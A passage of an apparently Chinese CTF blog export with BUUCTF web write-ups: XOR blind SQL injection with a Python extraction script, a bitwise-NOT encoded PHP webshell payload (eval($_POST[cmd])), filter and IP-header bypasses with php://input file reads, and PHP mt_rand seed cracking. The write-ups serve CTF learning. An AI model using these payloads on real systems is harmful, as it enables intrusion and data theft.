    <content type="text"><![CDATA[考点：异或注入打开 测试 1^1^1 正常 1^0^1 错误 构造payload 12345678# 查表1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())), 1,1))&gt;0)^1# 查列1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')), 1,1))&gt;0)^1# 查数据1^(ord(substr((select(group_concat(flag,value))from(flag)), 1,1))&gt;0)^1 表名 1[+] flag,score 列名 1[+] flag,value 上脚本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import requestsimport timedef payload(url, i, mid): # 猜解单个字段值 payload = "1^(ord(substr((select(group_concat(value))from(flag)), %d,1))&gt;=%s)^1"%(i,mid) payload_url = url + payload # time.sleep(1) print(payload) resp = requests.get(payload_url) # 如果能够执行下列语句 则代表着 大于或等于 if "admin" in resp.text: # 再次进行判断 payload = "1^(ord(substr((select(group_concat(value))from(flag)), %d,1))=%s)^1"%(i,mid) payload_url = url + payload time.sleep(1) print(payload) resp = requests.get(payload_url) if "admin" in resp.text: # 拿到目标数 return 200 else: # 小于目标值 return 203 # 大于目标值 else: return 400def exp(url): column_value = "" for i in range(1,300): start = 33 end = 127 while start &lt;= end: mid = (start + end) // 2 res = payload(url,i,mid) print("[*] 返回码：" + str(res)) # 代表找到 if res == 200: print("[+] mid = "+str(mid)) column_value += chr(mid) break # 代表是小于字符ascii码值 elif res == 203: start = mid + 1 # 代表是大于 ascii码值 elif res == 400: end = mid - 1 print("[+] " + column_value) if __name__=='__main__': url = "http://2881a64e-02bf-4c71-b948-26b1a1e6c0ae.node3.buuoj.cn/?stunum=" exp(url)]]></content>
      <categories>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>异或注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【极客大挑战 2019】RCE ME 1]]></title>
    <url>%2F2021%2F04%2F22%2F%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DRCE%20ME%201%2F</url>
    <content type="text"><![CDATA[考点：无字母数字 getshell打开开门见山，直接给出源代码。 1234567891011121314151617&lt;?phperror_reporting(0);if(isset($_GET['code']))&#123; $code=$_GET['code']; if(strlen($code)&gt;40)&#123; die("This is too Long."); &#125; if(preg_match("/[A-Za-z0-9]+/",$code))&#123; die("NO."); &#125; @eval($code);&#125;else&#123; highlight_file(__FILE__);&#125;// ?&gt; 看到这道题，我就想到p神。首先，这道题是出再php7环境下，php7和php5 有不一样的解法。 两个条件 传入值得长度不能大于40位 1if(strlen($code)&gt;40) 传入的值 不能存在 字母 数字 1preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code)) php7前是不允许用($a)(); 这种方法来执行动态函数。php7支持了该方式。 123456$c = 'phpinfo';# 对 phpinfo 进行取反 再url编码输出echo urlencode(~$c);// %8F%97%8F%96%91%99%90 去请求 12GET：?code=(~%8F%97%8F%96%91%99%90)(); 能够成功执行。这里可以查看disable_functions禁用了哪些函数。 常用的 system exec shell_exec 都被禁用。 用 assert 来 执行 eval($_POST[cmd]) 123456$str1 = 'assert';echo urlencode(~$str1);$str2 = '(eval($_POST[cmd]))';echo '\n';echo urlencode(~$str2);// %9E%8C%8C%9A%8D%8B\n%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9C%92%9B%A2%D6%D6 1234GET：?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9C%92%9B%A2%D6%D6);POST:cmd=phpinfo(); 回显 蚁剑连接 可以在根目录下看到flag 文件，但是不能打开，需要用到蚁剑的插件。 因为许多函数被禁用，终端不能执行命令，用这个插件可以在终端中成功执行命令。 总结]]></content>
      <categories>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>preg_match绕过</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【MRCTF2020】套娃 1]]></title>
    <url>%2F2021%2F04%2F22%2F%5BMRCTF2020%5D%E5%A5%97%E5%A8%83%201%2F</url>
    <content type="text"><![CDATA[考点：代码审计和字符绕过打开一个平淡无奇的页面，查看源代码，得到一串代码 12345678910//1st# 拿到?后面的字符串$query = $_SERVER['QUERY_STRING']; if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 )&#123; die('Y0u are So cutE!');&#125; if($_GET['b_u_p_t'] !== '23333' &amp;&amp; preg_match('/^23333$/', $_GET['b_u_p_t']))&#123; echo "you are going to the next ~";&#125; 经过分析，需要绕过两个条件 第一个 $query 中不能存在 _ %5f 1if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ) 第二个 $_GET[‘b_u_p_t’] 不能为 23333 用正常匹配 又必须为 23333 1if($_GET['b_u_p_t'] !== '23333' &amp;&amp; preg_match('/^23333$/', $_GET['b_u_p_t'])) 绕过方式 12?b.u.p.t=23333%0a?b%20u%20p%20t=23333%0a %20 . 用于绕过 _ ，%0a 绕过 正则首尾固定匹配。 回显 访问 源代码 1[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[!+[]+!+[]]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]]((+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[+!+[]])+(![]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]])()())[!+[]+!+[]+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+[+!+[]])+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+([+[]]+![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+[]]]) 得到一串有规律的字符，放入控制台。 弹出 post me Merak 12POST:Merak=1 回显了源代码 12345678910111213141516171819202122232425262728&lt;?php error_reporting(0); include 'takeip.php';ini_set('open_basedir','.'); include 'flag.php';if(isset($_POST['Merak']))&#123; highlight_file(__FILE__); die(); &#125; function change($v)&#123; $v = base64_decode($v); $re = ''; for($i=0;$i&lt;strlen($v);$i++)&#123; $re .= chr ( ord ($v[$i]) + $i*2 ); &#125; return $re; &#125;echo 'Local access only!'."&lt;br/&gt;";$ip = getIp();if($ip!='127.0.0.1')echo "Sorry,you don't have permission! Your ip is :".$ip;if($ip === '127.0.0.1' &amp;&amp; file_get_contents($_GET['2333']) === 'todat is a happy day' )&#123;echo "Your REQUEST is:".change($_GET['file']);echo file_get_contents(change($_GET['file'])); &#125;?&gt; 可以通过file_get_contents 来读取flag。 有两个条件 和 一个函数对输入内容进行处理 1if($ip === '127.0.0.1' &amp;&amp; file_get_contents($_GET['2333']) === 'todat is a happy day' ) 访问ip为 127.0.0.1 file_get_contents($_GET[‘2333’]) 读取的内容 为’todat is a happy day’ 绕过的方式都很简单 12构造header头Client-ip: 127.0.0.1 12345GET:?2333=php://inputPOST:todat is a happy day 接下来就是 反转对输入内容的处理 这个函数会将输入的字符进行base64解码，进行遍历，将每个字符转换成ascii码 + 当前位置2，在转换成字符。比如 ok，会将 o 转换成ascii码 111，再将 `111+12，就会得到113，再转换为字符q。kascii则是107，107+2*2=111，就会为o`。 12345678function change($v)&#123; $v = base64_decode($v); $re = ''; for($i=0;$i&lt;strlen($v);$i++)&#123; $re .= chr ( ord ($v[$i]) + $i*2 ); &#125; return $re; &#125; 写了一段反转的代码 123456789101112131415161718function change2($v)&#123; $re = ''; # 遍历字符串 for($i=0;$i&lt;strlen($v);$i++)&#123; # 将字符转换为ascii码值 + 当前字符下标的两倍// $re .= chr ( ord ($v[$i]) + $i*2 ); 0=&gt;0 1=&gt;2 2=&gt;4 $re .= chr(ord($v[$i]) - $i*2); &#125; $v = base64_encode($re); return $v;&#125;echo change2('flag.php');// 得到 ZmpdYSZmXGI= 最后 1234GET:?2333=php://input&amp;file=ZmpdYSZmXGI=POST:todat is a happy day 12构造header头Client-ip: 127.0.0.1 请求]]></content>
      <categories>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【GWCTF 2019】枯燥的抽奖 1]]></title>
    <url>%2F2021%2F04%2F21%2F%5BGWCTF%202019%5D%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96%201%2F</url>
    <content type="text"><![CDATA[考点：PHP伪随机数的破解打开 以为是爆破后面10位密码，用bp提交了下，发现好像回显有代码，找到后发现被隐藏了，解开得到下面。 12345678910111213141516171819202122232425262728293031&lt;?php#这不是抽奖程序的源代码！不许看！header("Content-Type: text/html;charset=utf-8");session_start();if(!isset($_SESSION['seed']))&#123;$_SESSION['seed']=rand(0,999999999);&#125;mt_srand($_SESSION['seed']);$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";$str='';$len1=20;# 生成20位字符串for ( $i = 0; $i &lt; $len1; $i++ )&#123; # 在 $str_long1 中 随机截取 0-61 中的一个 $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); &#125;# 显示生成的前10位$str_show = substr($str, 0, 10);echo "&lt;p id='p1'&gt;".$str_show."&lt;/p&gt;";if(isset($_POST['num']))&#123; if($_POST['num']===$str)&#123;x echo "&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;"; &#125; else&#123; echo "&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;"; &#125;&#125;show_source("check.php"); 这道题，在我去搜索mt_rand函数的用法的时候，搜索到一些信息。mt_rand是用来生成随机数的，但是如果mt_srand()函数的seep参数被固定后，mt_rand函数生成的随机数，就会有迹可循。 12$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";$str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); 这句代码的意思是 随机截取一个字符串，在$str_long1这个字符串当中，但是我们如果需要爆破的话，需要找到截取到的字符串对应的下位置，因为这个位置就是mt_rand生成的随机数。 根据对应的字符串 来生成对应的 数字 假设 这个字符串为VbjzN5cCrb 1234567891011121314str1='abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'str2='VbjzN5cCrb'str3 = str1[::-1]length = len(str2)res=''for i in range(len(str2)): for j in range(len(str1)): if str2[i] == str1[j]: res+=str(j)+' '+str(j)+' '+'0'+' '+str(len(str1)-1)+' ' breakprint(res)// 就会转换成这样 // 57 57 0 61 1 1 0 61 